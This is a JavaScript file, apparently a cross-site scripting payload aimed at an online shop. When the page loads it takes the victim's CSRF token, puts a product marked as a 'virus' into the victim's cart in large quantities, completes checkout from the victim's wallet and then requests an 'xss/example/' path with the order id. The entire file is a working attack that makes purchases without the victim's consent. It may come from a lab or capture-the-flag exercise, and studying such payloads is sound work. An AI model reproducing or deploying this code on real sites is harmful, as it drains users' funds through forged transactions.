const AMOUNT = [10000, 1000, 100, 10]

function xss(i=0) {
    if (i === AMOUNT.length) return;
    try {
        const cart_form = new FormData();
        const amount = AMOUNT[i].toString();
        const csrftoken = document.querySelector("input[type=hidden][name=csrfmiddlewaretoken]").value;
        cart_form.set("csrfmiddlewaretoken", csrftoken);
        cart_form.set("quantity", amount);

        fetch("/cart/", {method: "GET"}).then(
            res => {
                if (!res.ok) {
                    throw new Error('Network response was not ok');
                }
                return res.text()
            }
        ).then(
            html => {
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, "text/html");
                const cart_form = new FormData();
                cart_form.set("csrfmiddlewaretoken", csrftoken);
                cart_form.set("quantity", amount);

                let virus = doc.querySelector("img[src='https://isp.dc-yan.top/media/product_thumbnails/xss_v.png']");

                if (virus) {
                    virus = virus.parentElement.parentElement;
                    return fetch("cart/edit/item/"+virus.getAttribute("data-cart-line-id"), {method: "POST", body: cart_form}).then(
                        res => {
                            console.log("success");
                            return virus;
                        }
                    )
                } else {
                    return fetch("cart/create/item/PROD-1776410927-7606", {method: "POST", body: cart_form}).then(
                        res => {
                            console.log("success")
                            return res.text()
                        }
                    ).then(html => {
                        const parser = new DOMParser();
                        const doc = parser.parseFromString(html, "text/html");
                        return doc.querySelector("img[src='https://isp.dc-yan.top/media/product_thumbnails/xss_v.png']").parentElement.parentElement;
                    })
                }
            }
        ).then(virus => {
            const checkout_url = "cart/checkout/?items="+virus.getAttribute("data-cart-line-id");
            fetch(checkout_url, {method: "GET"}).then(
                res => res.text()
            ).then(html => {
                const parser = new DOMParser();
                const doc = parser.parseFromString(html, "text/html");
                const checkout_form = doc.querySelector("#checkout-form");
                if (doc.querySelector("a[href='/user/wallet/deposit/']")) {
                    xss(i+1);
                }
                fetch(checkout_url, {method: "POST", body: new FormData(checkout_form)}).then(res => {
                    console.log("success");
                    return res.text()
                }).then(html => {
                    const parser = new DOMParser();
                    const doc = parser.parseFromString(html, "text/html");
                    let is_first = true;
                    doc.querySelectorAll("a.col[style='text-decoration: none; color: inherit; display: block;']").forEach(row => {
                        if (is_first) {
                            is_first = false;
                            const url = new URL(row.href).pathname.split("/");
                            console.log(url)
                            fetch("xss/example/"+url[url.length-2]).then(res => {})
                        }
                    })
                })
            });
        }).catch(e => {
            console.log("failure",  e);
        });
    } catch (e) {
        console.log("failure", e);
    }
}

document.addEventListener('DOMContentLoaded', () => {xss()})